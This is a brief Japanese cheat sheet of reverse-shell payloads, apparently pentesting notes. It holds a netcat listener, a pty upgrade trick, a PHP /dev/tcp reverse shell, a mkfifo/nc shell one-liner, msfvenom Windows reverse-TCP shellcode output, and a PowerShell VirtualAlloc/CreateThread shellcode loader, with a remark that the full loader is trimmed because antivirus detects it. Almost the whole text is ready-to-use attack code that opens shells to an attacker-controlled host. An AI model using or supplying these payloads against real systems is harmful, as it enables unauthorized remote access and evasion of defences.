# リバースシェル

## メモ

### listen

```shell
nc -lvp <port>
```

### リバースシェルで su を実行できるようにする魔法

```shell
python -c 'import pty; pty.spawn("/bin/bash")'
su - <user>
```

## 言語別

### PHP

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'") ?>
```

### shell
```shell
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ip> <port> > /tmp/f
```

### msfvenom & Powershell シェルコード
```shell
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f powershell

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of powershell file: 2259 bytes
[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x0,0x0,0x0,0x41,（長いので省略）
```

PowerShellで、この buf のバイト列を、VirtualAllocしたメモリにコピーし、CreateThreadにアドレスを渡すことで実行される。  
ウイルス検出されるので全体は書けないが、↓のイメージ。

```powershell
[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
$thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
```


